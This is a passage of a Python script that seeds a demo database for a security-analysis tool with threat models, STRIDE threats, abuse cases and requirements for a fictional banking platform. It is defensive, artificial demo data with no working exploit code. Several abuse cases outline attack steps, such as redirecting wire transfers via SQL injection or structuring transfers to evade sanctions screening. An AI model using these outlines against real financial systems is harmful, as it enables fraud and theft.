        INSERT INTO client_threat_intel (project_id, intel_type, title, description, severity, threat_category, mitre_techniques, regulatory_impact, recommended_controls, tags, source, active, created_by, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, ?, ?)
    """, (PROJECT_ID, itype, title, desc, sev, stride, mitre, reg, controls, tags, source, USER_EMAIL, NOW))

print(f"   → {len(intel_entries)} threat intel entries created")

# ============================================================
# 8. SECURITY ANALYSES (for user stories)
# ============================================================
print("[8/8] Adding security analyses for user stories...")

# Wire Transfer story (APEX-101) — detailed analysis
wire_story_id = story_ids[0]
c.execute("""
    INSERT INTO security_analyses (user_story_id, version, abuse_cases, stride_threats, security_requirements, risk_score, risk_factors, ai_model_used, analysis_duration_ms, created_at)
    VALUES (?, 1, ?, ?, ?, ?, ?, ?, ?, ?)
""", (
    wire_story_id,
    json.dumps([
        {"id": "AC-001", "threat": "Wire Transfer Manipulation via SQL Injection", "actor": "External Attacker", "description": "Attacker exploits SQL injection in beneficiary account lookup to redirect wire transfers to attacker-controlled accounts. Targets the WireTransferService query that concatenates user input.", "impact": "critical", "likelihood": "high", "stride_category": "Tampering", "attack_steps": ["Identify SQL injection in beneficiary lookup", "Craft payload to modify destination account", "Initiate wire transfer that routes to attacker account"], "mitre_technique": "T1190"},
        {"id": "AC-002", "threat": "OFAC Sanctions Screening Bypass", "actor": "Sanctioned Entity", "description": "Sanctioned individual or entity exploits the $3,000 threshold bug to send multiple sub-threshold wire transfers, evading OFAC screening. This violates BSA/AML regulations.", "impact": "critical", "likelihood": "medium", "stride_category": "Elevation of Privilege", "attack_steps": ["Identify that transfers under $3,000 skip OFAC screening", "Structure transfers to stay under threshold (structuring)", "Send funds to sanctioned entities without detection"]},
        {"id": "AC-003", "threat": "Unauthorized Wire Transfer via Session Hijacking", "actor": "External Attacker", "description": "Attacker steals session token via XSS or insecure cookie configuration to initiate wire transfers on behalf of a legitimate user without their knowledge.", "impact": "high", "likelihood": "medium", "stride_category": "Spoofing", "attack_steps": ["Exploit XSS to steal session cookie", "Replay cookie to authenticate as victim", "Initiate wire transfer bypassing MFA (session already authenticated)"]},
        {"id": "AC-004", "threat": "Dual-Approval Bypass by Compromised Approver", "actor": "Insider Threat", "description": "A malicious or compromised authorized signer approves fraudulent wire transfers, bypassing the dual-control requirement. Single approver with both initiation and approval rights.", "impact": "high", "likelihood": "low", "stride_category": "Elevation of Privilege", "attack_steps": ["Gain access to an approver account", "Self-approve fraudulent wire transfers", "Mask activity in audit logs"]},
    ]),
    json.dumps({
        "Spoofing": [{"id": "S-001", "threat": "Session hijacking to impersonate legitimate user for wire transfers", "severity": "high", "mitigation": "Enforce re-authentication for wire transfer initiation. Bind session to device fingerprint."}],
        "Tampering": [{"id": "T-001", "threat": "SQL injection to manipulate beneficiary account details", "severity": "critical", "mitigation": "Use parameterized queries. Implement beneficiary verification callback."}, {"id": "T-002", "threat": "CSRF on wire transfer form to trigger unauthorized transfers", "severity": "high", "mitigation": "Enable CSRF tokens. Require MFA confirmation for each transfer."}],
        "Repudiation": [{"id": "R-001", "threat": "Incomplete audit trail for wire transfer approvals", "severity": "medium", "mitigation": "Log all approval/rejection actions with timestamp, IP, and user identity to immutable audit log."}],
        "Information Disclosure": [{"id": "I-001", "threat": "Beneficiary account details exposed in API responses to unauthorized users", "severity": "high", "mitigation": "Mask account numbers. Enforce ownership checks on all account data endpoints."}],
        "Denial of Service": [{"id": "D-001", "threat": "Flooding wire transfer API to disrupt payment processing", "severity": "medium", "mitigation": "Rate limit wire transfer endpoint. Implement circuit breaker for Fedwire gateway."}],
        "Elevation of Privilege": [{"id": "E-001", "threat": "Bypassing dual-approval by exploiting role assignment flaws", "severity": "critical", "mitigation": "Enforce separation of duties: initiator cannot be approver. Validate role at both initiation and approval time."}],
    }),
    json.dumps([
        {"id": "SR-001", "requirement": "All wire transfer queries MUST use parameterized SQL statements (PreparedStatement/JPA named parameters)", "priority": "critical", "category": "Input Validation"},
        {"id": "SR-002", "requirement": "OFAC/SDN screening MUST be performed on ALL wire transfers regardless of amount", "priority": "critical", "category": "Compliance"},
        {"id": "SR-003", "requirement": "Wire transfers > $10,000 MUST require dual-approval from separate authorized signers", "priority": "critical", "category": "Authorization"},
        {"id": "SR-004", "requirement": "Re-authentication (MFA) MUST be required before wire transfer submission", "priority": "high", "category": "Authentication"},
        {"id": "SR-005", "requirement": "All wire transfer actions (initiate, approve, reject, cancel) MUST be logged to immutable audit trail", "priority": "high", "category": "Audit"},
        {"id": "SR-006", "requirement": "Beneficiary account details MUST be masked in all API responses and UI displays", "priority": "high", "category": "Data Protection"},
        {"id": "SR-007", "requirement": "CSRF protection MUST be enabled on all wire transfer endpoints", "priority": "high", "category": "Session Security"},
        {"id": "SR-008", "requirement": "Wire transfer API MUST enforce rate limiting (max 10 transfers per hour per user)", "priority": "medium", "category": "Availability"},
        {"id": "SR-009", "requirement": "Fedwire/SWIFT message generation MUST use validated and signed message formats", "priority": "high", "category": "Data Integrity"},
        {"id": "SR-010", "requirement": "Real-time notification (email + push) MUST be sent on transfer initiation and completion", "priority": "medium", "category": "Monitoring"},
    ]),
    92,  # risk score
    json.dumps({"data_sensitivity": "critical", "attack_surface": "high", "regulatory_impact": "critical", "business_criticality": "critical"}),
    "claude-sonnet-4-20250514",
    18500,
    NOW,
))

# Auth story (APEX-102)
auth_story_id = story_ids[1]
c.execute("""
    INSERT INTO security_analyses (user_story_id, version, abuse_cases, stride_threats, security_requirements, risk_score, risk_factors, ai_model_used, analysis_duration_ms, created_at)
    VALUES (?, 1, ?, ?, ?, ?, ?, ?, ?, ?)
""", (
    auth_story_id,
    json.dumps([
        {"id": "AC-001", "threat": "Credential Stuffing Attack", "actor": "External Attacker", "description": "Attacker uses credentials from data breaches to attempt login. Without rate limiting and account lockout, automated tools can test millions of credential pairs.", "impact": "high", "likelihood": "high", "stride_category": "Spoofing"},
        {"id": "AC-002", "threat": "SIM Swap to Bypass SMS OTP", "actor": "External Attacker", "description": "Attacker social-engineers mobile carrier to swap victim's SIM, then intercepts SMS OTP to complete authentication bypass.", "impact": "high", "likelihood": "medium", "stride_category": "Spoofing"},
        {"id": "AC-003", "threat": "JWT Token Forgery via alg:none", "actor": "External Attacker", "description": "Attacker forges JWT by setting algorithm to 'none', bypassing signature verification to impersonate any user.", "impact": "critical", "likelihood": "high", "stride_category": "Spoofing"},
    ]),
    json.dumps({
        "Spoofing": [{"id": "S-001", "threat": "Credential stuffing using breached credentials", "severity": "high"}, {"id": "S-002", "threat": "JWT forgery via algorithm confusion", "severity": "critical"}],
        "Tampering": [{"id": "T-001", "threat": "Session fixation to hijack authenticated session", "severity": "high"}],
        "Repudiation": [{"id": "R-001", "threat": "Failed to log authentication attempts", "severity": "medium"}],
        "Information Disclosure": [{"id": "I-001", "threat": "User enumeration via different error messages", "severity": "medium"}],
        "Elevation of Privilege": [{"id": "E-001", "threat": "Privilege escalation via role manipulation in JWT claims", "severity": "critical"}],
    }),
    json.dumps([
        {"id": "SR-001", "requirement": "Implement adaptive MFA with FIDO2/WebAuthn as primary second factor", "priority": "critical", "category": "Authentication"},
        {"id": "SR-002", "requirement": "Rate limit login endpoint: 5 attempts/minute per IP and per account", "priority": "critical", "category": "Authentication"},
        {"id": "SR-003", "requirement": "Lock account after 5 consecutive failed attempts for 30 minutes", "priority": "high", "category": "Authentication"},
        {"id": "SR-004", "requirement": "JWT MUST use RS256 algorithm and reject alg:none", "priority": "critical", "category": "Session Security"},
        {"id": "SR-005", "requirement": "Log all authentication events (success/failure) with IP, device, and timestamp", "priority": "high", "category": "Audit"},
        {"id": "SR-006", "requirement": "Implement impossible travel detection for login risk scoring", "priority": "medium", "category": "Fraud Detection"},
        {"id": "SR-007", "requirement": "Session idle timeout: 15 minutes. Absolute timeout: 8 hours", "priority": "high", "category": "Session Security"},
        {"id": "SR-008", "requirement": "Generic error messages — do not reveal whether username or password is incorrect", "priority": "medium", "category": "Information Protection"},
    ]),
    88,
    json.dumps({"data_sensitivity": "critical", "attack_surface": "high", "regulatory_impact": "high", "business_criticality": "critical"}),
    "claude-sonnet-4-20250514",
    15200,
    NOW,
))

# Detailed analyses for remaining stories (APEX-103 through APEX-108)
remaining_analyses = [
    # APEX-103: Account balance and transaction history API
    {
        "abuse_cases": [
            {"id": "AC-001", "threat": "IDOR — Access other customers' account balances", "actor": "Authenticated User", "description": "Attacker enumerates sequential account IDs to view balances and transaction history of other customers.", "impact": "high", "likelihood": "high", "stride_category": "Information Disclosure", "mitre_technique": "T1530"},
            {"id": "AC-002", "threat": "Data scraping via unrestricted pagination", "actor": "External Attacker", "description": "Attacker uses API pagination to bulk-extract transaction history for data mining or competitive intelligence.", "impact": "medium", "likelihood": "medium", "stride_category": "Information Disclosure"},
            {"id": "AC-003", "threat": "Account number exposure in API responses", "actor": "External Attacker", "description": "Full account numbers returned in transaction API responses can be intercepted or cached by proxies.", "impact": "high", "likelihood": "medium", "stride_category": "Information Disclosure"},
        ],
        "stride_threats": {
            "Information Disclosure": [{"id": "I-001", "threat": "IDOR leaking account balances to unauthorized users", "severity": "high", "mitigation": "Verify account ownership before returning data"}],
            "Tampering": [{"id": "T-001", "threat": "Parameter manipulation to bypass pagination limits", "severity": "medium", "mitigation": "Server-side pagination enforcement with max page size"}],
            "Repudiation": [{"id": "R-001", "threat": "Missing audit log for balance inquiries", "severity": "medium", "mitigation": "Log all account data access with user ID and timestamp"}],
        },
        "requirements": [
            {"id": "SR-001", "requirement": "Account balance API MUST verify ownership — user can only access their own accounts", "priority": "critical", "category": "Authorization"},
            {"id": "SR-002", "requirement": "Account numbers MUST be masked in all API responses (show last 4 digits only)", "priority": "high", "category": "Data Protection"},
            {"id": "SR-003", "requirement": "Pagination MUST be server-enforced with max 100 transactions per page", "priority": "medium", "category": "Input Validation"},
            {"id": "SR-004", "requirement": "Response time for balance queries MUST be < 200ms (prevent timing attacks)", "priority": "medium", "category": "Performance"},
            {"id": "SR-005", "requirement": "All account data access MUST be logged to audit trail", "priority": "high", "category": "Audit"},
            {"id": "SR-006", "requirement": "CSV/PDF export MUST include watermark with requesting user ID", "priority": "medium", "category": "Data Protection"},
        ],
        "risk_score": 78, "risk_factors": {"data_sensitivity": "critical", "attack_surface": "high", "regulatory_impact": "high", "business_criticality": "high"},
    },
    # APEX-104: Bill payment scheduling
    {
        "abuse_cases": [
            {"id": "AC-001", "threat": "Modify scheduled payment to redirect funds", "actor": "External Attacker", "description": "Attacker gains access to session and modifies pending scheduled payment destination to attacker-controlled account.", "impact": "high", "likelihood": "medium", "stride_category": "Tampering"},
            {"id": "AC-002", "threat": "Create fraudulent recurring payment", "actor": "Insider Threat", "description": "Compromised account sets up small recurring payment to external account, exploiting the lack of monitoring on low-value recurring transfers.", "impact": "medium", "likelihood": "medium", "stride_category": "Tampering"},
        ],
        "stride_threats": {
            "Tampering": [{"id": "T-001", "threat": "Modification of scheduled payment details after submission", "severity": "high", "mitigation": "Re-authenticate user before any payment modification"}],
            "Spoofing": [{"id": "S-001", "threat": "Unauthorized payee creation using stolen session", "severity": "high", "mitigation": "Require MFA step-up for adding new payees"}],
            "Denial of Service": [{"id": "D-001", "threat": "Insufficient funds causing cascading payment failures", "severity": "medium", "mitigation": "Implement retry logic with exponential backoff and user notification"}],
        },
        "requirements": [
            {"id": "SR-001", "requirement": "Adding new payees MUST require MFA re-authentication", "priority": "critical", "category": "Authentication"},
            {"id": "SR-002", "requirement": "Payment modification MUST require re-authentication within 5-minute window", "priority": "high", "category": "Authentication"},
            {"id": "SR-003", "requirement": "Recurring payment changes MUST trigger email/push notification to account holder", "priority": "high", "category": "Monitoring"},
            {"id": "SR-004", "requirement": "Payment amounts MUST be validated: positive, max 2 decimals, within daily/weekly limits", "priority": "high", "category": "Input Validation"},
            {"id": "SR-005", "requirement": "Payee account numbers MUST be validated via micro-deposit verification", "priority": "medium", "category": "Data Integrity"},
        ],
        "risk_score": 72, "risk_factors": {"data_sensitivity": "high", "attack_surface": "medium", "regulatory_impact": "medium", "business_criticality": "high"},
    },
    # APEX-105: KYC document upload
    {
        "abuse_cases": [
            {"id": "AC-001", "threat": "Upload malicious executable as KYC document", "actor": "External Attacker", "description": "Attacker uploads JSP/WAR file disguised as PDF during KYC process. If stored in webroot, achieves remote code execution.", "impact": "critical", "likelihood": "medium", "stride_category": "Tampering", "mitre_technique": "T1105"},
            {"id": "AC-002", "threat": "Identity fraud via synthetic documents", "actor": "External Attacker", "description": "Attacker submits AI-generated fake ID documents to open fraudulent accounts. Bypasses basic OCR verification.", "impact": "high", "likelihood": "high", "stride_category": "Spoofing"},
            {"id": "AC-003", "threat": "PII data exfiltration from document storage", "actor": "Insider Threat", "description": "Employee with S3 access bulk-downloads KYC documents containing customer passports and SSN.", "impact": "critical", "likelihood": "low", "stride_category": "Information Disclosure"},
        ],
        "stride_threats": {
            "Tampering": [{"id": "T-001", "threat": "Malicious file upload leading to RCE", "severity": "critical", "mitigation": "Allowlist file types (PDF, JPG, PNG only). Store outside webroot."}],
            "Spoofing": [{"id": "S-001", "threat": "Synthetic identity fraud via fake documents", "severity": "high", "mitigation": "Liveness detection + face matching with >95% confidence threshold"}],
            "Information Disclosure": [{"id": "I-001", "threat": "KYC document exfiltration by insider", "severity": "critical", "mitigation": "AES-256 encryption at rest. Access logging. DLP on S3 bucket."}],
        },
        "requirements": [
            {"id": "SR-001", "requirement": "File upload MUST validate type against allowlist: PDF, JPG, PNG only", "priority": "critical", "category": "Input Validation"},
            {"id": "SR-002", "requirement": "Uploaded files MUST be scanned for malware before storage", "priority": "critical", "category": "Security"},
            {"id": "SR-003", "requirement": "KYC documents MUST be encrypted with AES-256-GCM at rest", "priority": "critical", "category": "Data Protection"},
            {"id": "SR-004", "requirement": "Liveness detection MUST achieve >95% confidence for selfie verification", "priority": "high", "category": "Authentication"},
            {"id": "SR-005", "requirement": "Documents MUST be auto-purged after 7-year retention period per GLBA", "priority": "high", "category": "Compliance"},
            {"id": "SR-006", "requirement": "All document access MUST be logged with accessor identity and business justification", "priority": "high", "category": "Audit"},
            {"id": "SR-007", "requirement": "PEP and sanctions screening MUST run before account activation", "priority": "critical", "category": "Compliance"},
        ],
        "risk_score": 85, "risk_factors": {"data_sensitivity": "critical", "attack_surface": "high", "regulatory_impact": "critical", "business_criticality": "high"},
    },
    # APEX-106: Fraud detection engine
    {
        "abuse_cases": [
            {"id": "AC-001", "threat": "Model evasion — structuring transactions below threshold", "actor": "External Attacker", "description": "Attacker learns fraud detection thresholds and structures transactions to stay below detection limits, evading ML model.", "impact": "high", "likelihood": "medium", "stride_category": "Tampering"},
            {"id": "AC-002", "threat": "Alert fatigue via false positive flooding", "actor": "External Attacker", "description": "Attacker triggers high volume of false positive alerts to overwhelm fraud analysts, masking real fraudulent activity.", "impact": "high", "likelihood": "low", "stride_category": "Denial of Service"},
        ],
        "stride_threats": {
            "Tampering": [{"id": "T-001", "threat": "ML model evasion via adversarial inputs", "severity": "high", "mitigation": "Combine ML with rule-based checks. Regularly retrain on new attack patterns."}],
            "Denial of Service": [{"id": "D-001", "threat": "Alert flooding to create analyst fatigue", "severity": "medium", "mitigation": "Implement alert deduplication and priority scoring"}],
            "Information Disclosure": [{"id": "I-001", "threat": "Fraud detection rules leaked to attackers", "severity": "high", "mitigation": "Restrict access to fraud rules. Audit all rule change access."}],
        },
        "requirements": [
            {"id": "SR-001", "requirement": "Fraud engine MUST process transactions within 500ms latency SLA", "priority": "critical", "category": "Performance"},
            {"id": "SR-002", "requirement": "Detection rules MUST be auditable — all changes logged with approver", "priority": "high", "category": "Audit"},
            {"id": "SR-003", "requirement": "False positive rate MUST remain below 1% to prevent alert fatigue", "priority": "high", "category": "Accuracy"},
            {"id": "SR-004", "requirement": "Velocity checks MUST trigger for >5 transfers/hour from same account", "priority": "high", "category": "Fraud Detection"},
            {"id": "SR-005", "requirement": "Suspicious activity MUST generate SAR filing within 30 days per BSA/AML", "priority": "critical", "category": "Compliance"},
        ],
        "risk_score": 80, "risk_factors": {"data_sensitivity": "high", "attack_surface": "medium", "regulatory_impact": "critical", "business_criticality": "critical"},
    },
    # APEX-107: Debit card management
    {
        "abuse_cases": [
            {"id": "AC-001", "threat": "Unauthorized card activation via account takeover", "actor": "External Attacker", "description": "Attacker takes over customer account and activates a replacement card shipped to a new address.", "impact": "high", "likelihood": "medium", "stride_category": "Spoofing"},
            {"id": "AC-002", "threat": "Bypass spending limits via API manipulation", "actor": "External Attacker", "description": "Attacker modifies card limit update request to set daily limit to maximum, then makes large unauthorized purchases.", "impact": "high", "likelihood": "low", "stride_category": "Tampering"},
        ],
        "stride_threats": {
            "Spoofing": [{"id": "S-001", "threat": "Account takeover leading to unauthorized card activation", "severity": "high", "mitigation": "Require in-person or video KYC for address changes + card activation"}],
            "Tampering": [{"id": "T-001", "threat": "API parameter manipulation to bypass card limits", "severity": "high", "mitigation": "Server-side limit enforcement. Admin approval for limits >$5K/day."}],
            "Information Disclosure": [{"id": "I-001", "threat": "Card number exposure in API responses or logs", "severity": "high", "mitigation": "PCI-DSS compliant masking. Show only last 4 digits."}],
        },
        "requirements": [
            {"id": "SR-001", "requirement": "Card activation MUST require MFA + last 4 digits of SSN verification", "priority": "critical", "category": "Authentication"},
            {"id": "SR-002", "requirement": "Spending limit changes >$5,000/day MUST require supervisor approval", "priority": "high", "category": "Authorization"},
            {"id": "SR-003", "requirement": "Card numbers MUST be masked per PCI-DSS — show last 4 digits only", "priority": "critical", "category": "PCI Compliance"},
            {"id": "SR-004", "requirement": "Card freeze/unfreeze MUST take effect within 30 seconds", "priority": "high", "category": "Performance"},
            {"id": "SR-005", "requirement": "Address change + card reissue MUST trigger fraud review", "priority": "high", "category": "Fraud Detection"},
        ],
        "risk_score": 76, "risk_factors": {"data_sensitivity": "critical", "attack_surface": "medium", "regulatory_impact": "critical", "business_criticality": "high"},
    },
    # APEX-108: Admin portal with RBAC
    {
        "abuse_cases": [
            {"id": "AC-001", "threat": "Privilege escalation via role manipulation", "actor": "Insider Threat", "description": "Admin user modifies their own role to grant additional privileges, bypassing separation of duties controls.", "impact": "critical", "likelihood": "low", "stride_category": "Elevation of Privilege", "mitre_technique": "T1098"},
            {"id": "AC-002", "threat": "Bulk customer data export by rogue admin", "actor": "Insider Threat", "description": "Admin with database access exports customer PII in bulk for identity theft or sale on dark web.", "impact": "critical", "likelihood": "low", "stride_category": "Information Disclosure", "mitre_technique": "T1567"},
            {"id": "AC-003", "threat": "Audit log tampering to cover tracks", "actor": "Insider Threat", "description": "Malicious admin modifies or deletes audit logs to conceal unauthorized actions.", "impact": "high", "likelihood": "low", "stride_category": "Repudiation"},
        ],
        "stride_threats": {
            "Elevation of Privilege": [{"id": "E-001", "threat": "Self-assignment of elevated roles by admin", "severity": "critical", "mitigation": "Role changes require approval from a different admin. No self-service role elevation."}],
            "Information Disclosure": [{"id": "I-001", "threat": "Bulk PII export by privileged insider", "severity": "critical", "mitigation": "DLP controls on data exports. Alert on bulk queries >100 records."}],
            "Repudiation": [{"id": "R-001", "threat": "Audit log tampering by admin", "severity": "high", "mitigation": "Immutable audit logs (append-only). Ship to external SIEM in real-time."}],
        },
        "requirements": [
            {"id": "SR-001", "requirement": "Role changes MUST require approval from a different administrator", "priority": "critical", "category": "Authorization"},
            {"id": "SR-002", "requirement": "Admin sessions MUST have 15-minute idle timeout and 4-hour absolute timeout", "priority": "high", "category": "Session Security"},
            {"id": "SR-003", "requirement": "All admin actions MUST be logged to immutable, append-only audit trail", "priority": "critical", "category": "Audit"},
            {"id": "SR-004", "requirement": "Bulk data export (>100 records) MUST trigger DLP alert and require justification", "priority": "critical", "category": "Data Protection"},
            {"id": "SR-005", "requirement": "Admin portal MUST be accessible only from corporate VPN/zero-trust network", "priority": "high", "category": "Network Security"},
            {"id": "SR-006", "requirement": "Quarterly access reviews MUST verify least-privilege for all admin accounts", "priority": "high", "category": "Compliance"},
            {"id": "SR-007", "requirement": "Admin authentication MUST use hardware security key (FIDO2) — no SMS OTP", "priority": "critical", "category": "Authentication"},
        ],
        "risk_score": 82, "risk_factors": {"data_sensitivity": "critical", "attack_surface": "medium", "regulatory_impact": "critical", "business_criticality": "critical"},
    },
]

for i, analysis in enumerate(remaining_analyses):
    sid = story_ids[i + 2]  # stories 3-8 (index 2-7)
    c.execute("""
        INSERT INTO security_analyses (user_story_id, version, abuse_cases, stride_threats, security_requirements, risk_score, risk_factors, ai_model_used, analysis_duration_ms, created_at)
        VALUES (?, 1, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        sid,
        json.dumps(analysis["abuse_cases"]),
        json.dumps(analysis["stride_threats"]),
        json.dumps(analysis["requirements"]),
        analysis["risk_score"],
        json.dumps(analysis["risk_factors"]),
        "claude-sonnet-4-20250514",
        14000 + (i * 800),
        NOW,
    ))

print(f"   → Security analyses created for all {len(story_ids)} stories")

# ============================================================
# 9. THREAT MODEL
# ============================================================
print("[9/9] Adding threat model...")

dfd_nodes = [
    {"id": "comp_0", "label": "Web Banking Portal", "type": "process", "category": "frontend", "technology": "React SPA", "trust_level": "untrusted", "internet_facing": True, "handles_sensitive_data": True},
    {"id": "comp_1", "label": "Mobile Banking API Gateway", "type": "process", "category": "api_gateway", "technology": "FastAPI", "trust_level": "trusted", "internet_facing": True, "handles_sensitive_data": True},
    {"id": "comp_2", "label": "Authentication Service", "type": "process", "category": "backend", "technology": "Spring Boot", "trust_level": "trusted", "internet_facing": False, "handles_sensitive_data": True},
    {"id": "comp_3", "label": "Payment Engine", "type": "process", "category": "backend", "technology": "Spring Boot", "trust_level": "trusted", "internet_facing": False, "handles_sensitive_data": True},
    {"id": "comp_4", "label": "SWIFT Alliance Gateway", "type": "external_entity", "category": "external", "technology": "SWIFT", "trust_level": "trusted", "internet_facing": False, "handles_sensitive_data": True},
    {"id": "comp_5", "label": "PostgreSQL Database", "type": "datastore", "category": "database", "technology": "PostgreSQL", "trust_level": "trusted", "internet_facing": False, "handles_sensitive_data": True},
    {"id": "comp_6", "label": "Redis Cache", "type": "datastore", "category": "cache", "technology": "Redis", "trust_level": "trusted", "internet_facing": False, "handles_sensitive_data": True},
    {"id": "comp_7", "label": "Kafka Event Bus", "type": "process", "category": "messaging", "technology": "Apache Kafka", "trust_level": "trusted", "internet_facing": False, "handles_sensitive_data": True},
    {"id": "comp_8", "label": "Compliance Engine", "type": "process", "category": "backend", "technology": "Python", "trust_level": "trusted", "internet_facing": False, "handles_sensitive_data": True},
    {"id": "comp_9", "label": "Customer Browser", "type": "external_entity", "category": "client", "technology": "Browser", "trust_level": "untrusted", "internet_facing": True, "handles_sensitive_data": False},
    {"id": "comp_10", "label": "KYC Document Store", "type": "datastore", "category": "storage", "technology": "AWS S3", "trust_level": "trusted", "internet_facing": False, "handles_sensitive_data": True},
    {"id": "comp_11", "label": "Admin Portal", "type": "process", "category": "frontend", "technology": "React", "trust_level": "trusted", "internet_facing": True, "handles_sensitive_data": True},
]

dfd_edges = [
    {"source": "comp_9", "target": "comp_0", "label": "HTTPS requests", "protocol": "HTTPS/TLS 1.3", "data_classification": "sensitive"},
    {"source": "comp_0", "target": "comp_1", "label": "API calls", "protocol": "HTTPS", "data_classification": "sensitive"},
    {"source": "comp_1", "target": "comp_2", "label": "Auth requests", "protocol": "gRPC/mTLS", "data_classification": "critical"},
    {"source": "comp_1", "target": "comp_3", "label": "Transfer requests", "protocol": "gRPC/mTLS", "data_classification": "critical"},
    {"source": "comp_2", "target": "comp_5", "label": "User credentials", "protocol": "TCP/TLS", "data_classification": "critical"},
    {"source": "comp_2", "target": "comp_6", "label": "Session data", "protocol": "TCP", "data_classification": "sensitive"},
    {"source": "comp_3", "target": "comp_5", "label": "Transaction data", "protocol": "TCP/TLS", "data_classification": "critical"},
    {"source": "comp_3", "target": "comp_4", "label": "SWIFT MT103 messages", "protocol": "SWIFTNet", "data_classification": "critical"},
    {"source": "comp_3", "target": "comp_7", "label": "Transaction events", "protocol": "SASL/TLS", "data_classification": "sensitive"},
    {"source": "comp_7", "target": "comp_8", "label": "Transaction monitoring", "protocol": "SASL/TLS", "data_classification": "sensitive"},
    {"source": "comp_8", "target": "comp_5", "label": "SAR filings", "protocol": "TCP/TLS", "data_classification": "critical"},
    {"source": "comp_1", "target": "comp_10", "label": "KYC documents", "protocol": "HTTPS/S3", "data_classification": "critical"},
    {"source": "comp_11", "target": "comp_1", "label": "Admin operations", "protocol": "HTTPS", "data_classification": "sensitive"},
]

dfd_trust_boundaries = [
    {"id": "tb_0", "label": "Internet DMZ", "components": ["comp_9"], "trust_level": "untrusted"},
    {"id": "tb_1", "label": "Application Zone", "components": ["comp_0", "comp_1", "comp_11"], "trust_level": "semi-trusted"},
    {"id": "tb_2", "label": "Internal Services Zone", "components": ["comp_2", "comp_3", "comp_7", "comp_8"], "trust_level": "trusted"},
    {"id": "tb_3", "label": "Data Zone", "components": ["comp_5", "comp_6", "comp_10"], "trust_level": "highly-trusted"},
    {"id": "tb_4", "label": "SWIFT Network", "components": ["comp_4"], "trust_level": "external-trusted"},
]

stride_threats = {
    "Spoofing": [
        {"id": "threat_0", "component": "Web Banking Portal", "component_id": "comp_0", "component_type": "process", "component_category": "frontend", "category": "Spoofing", "threat": "Session Hijacking via XSS Cookie Theft", "severity": "high", "risk_score": 8.0, "cwe": "CWE-79", "cwe_id": "CWE-79", "mitre": ["T1189"], "mitre_techniques": ["T1189"], "likelihood": "high", "impact": "high", "description": "Attacker injects JavaScript to steal session cookies from the banking portal, enabling account takeover.", "mitigation": "Implement strict CSP headers. Set HttpOnly and Secure flags on all session cookies. Enable SameSite=Strict.", "review_status": "open", "references": {"cwe": "https://cwe.mitre.org/data/definitions/79.html"}},
        {"id": "threat_1", "component": "Authentication Service", "component_id": "comp_2", "component_type": "process", "component_category": "backend", "category": "Spoofing", "threat": "JWT Token Forgery via Algorithm Confusion", "severity": "critical", "risk_score": 9.5, "cwe": "CWE-347", "cwe_id": "CWE-347", "mitre": ["T1078"], "mitre_techniques": ["T1078"], "likelihood": "high", "impact": "critical", "description": "Attacker sets JWT algorithm to 'none' to forge valid authentication tokens, impersonating any user including admin.", "mitigation": "Explicitly validate JWT algorithm. Only accept RS256. Reject alg:none tokens.", "review_status": "open", "references": {"cwe": "https://cwe.mitre.org/data/definitions/347.html"}},
        {"id": "threat_2", "component": "Authentication Service", "component_id": "comp_2", "component_type": "process", "component_category": "backend", "category": "Spoofing", "threat": "Credential Stuffing Attack on Login API", "severity": "high", "risk_score": 7.5, "cwe": "CWE-307", "cwe_id": "CWE-307", "mitre": ["T1110.004"], "mitre_techniques": ["T1110.004"], "likelihood": "high", "impact": "high", "description": "Automated credential stuffing using leaked credential databases. No rate limiting allows unlimited login attempts.", "mitigation": "Implement rate limiting (5 attempts/min). Add CAPTCHA after 3 failures. Deploy bot detection.", "review_status": "open", "references": {"cwe": "https://cwe.mitre.org/data/definitions/307.html"}},
        {"id": "threat_3", "component": "Mobile Banking API Gateway", "component_id": "comp_1", "component_type": "process", "component_category": "api_gateway", "category": "Spoofing", "threat": "API Key Leakage from Mobile App", "severity": "medium", "risk_score": 5.5, "cwe": "CWE-798", "cwe_id": "CWE-798", "mitre": ["T1552"], "mitre_techniques": ["T1552"], "likelihood": "medium", "impact": "medium", "description": "Hardcoded API keys in mobile application can be extracted via reverse engineering.", "mitigation": "Use certificate pinning and dynamic token exchange. Never embed secrets in mobile binaries.", "review_status": "open", "references": {"cwe": "https://cwe.mitre.org/data/definitions/798.html"}},
    ],
    "Tampering": [
        {"id": "threat_4", "component": "Payment Engine", "component_id": "comp_3", "component_type": "process", "component_category": "backend", "category": "Tampering", "threat": "SQL Injection in Wire Transfer Query", "severity": "critical", "risk_score": 9.8, "cwe": "CWE-89", "cwe_id": "CWE-89", "mitre": ["T1190"], "mitre_techniques": ["T1190"], "likelihood": "high", "impact": "critical", "description": "SQL injection in beneficiary account lookup allows attacker to redirect wire transfers to attacker-controlled accounts.", "mitigation": "Use parameterized queries. Implement input validation. Deploy WAF rules for SQL injection.", "review_status": "open", "references": {"cwe": "https://cwe.mitre.org/data/definitions/89.html"}},
        {"id": "threat_5", "component": "Payment Engine", "component_id": "comp_3", "component_type": "process", "component_category": "backend", "category": "Tampering", "threat": "CSRF on Wire Transfer Submission", "severity": "high", "risk_score": 8.0, "cwe": "CWE-352", "cwe_id": "CWE-352", "mitre": ["T1557"], "mitre_techniques": ["T1557"], "likelihood": "medium", "impact": "critical", "description": "Missing CSRF protection on fund transfer form allows attacker to craft malicious page that submits transfers on behalf of logged-in users.", "mitigation": "Enable CSRF tokens on all state-changing forms. Require MFA for transfers.", "review_status": "open", "references": {"cwe": "https://cwe.mitre.org/data/definitions/352.html"}},
        {"id": "threat_6", "component": "Authentication Service", "component_id": "comp_2", "component_type": "process", "component_category": "backend", "category": "Tampering", "threat": "Mass Assignment in Customer Profile Update", "severity": "high", "risk_score": 7.5, "cwe": "CWE-915", "cwe_id": "CWE-915", "mitre": ["T1098"], "mitre_techniques": ["T1098"], "likelihood": "medium", "impact": "high", "description": "Customer profile update binds all request parameters to entity, allowing modification of role, accountStatus, and kycVerified fields.", "mitigation": "Use DTOs with explicit field allowlists. Never bind requests directly to entities.", "review_status": "open", "references": {"cwe": "https://cwe.mitre.org/data/definitions/915.html"}},
    ],
    "Repudiation": [
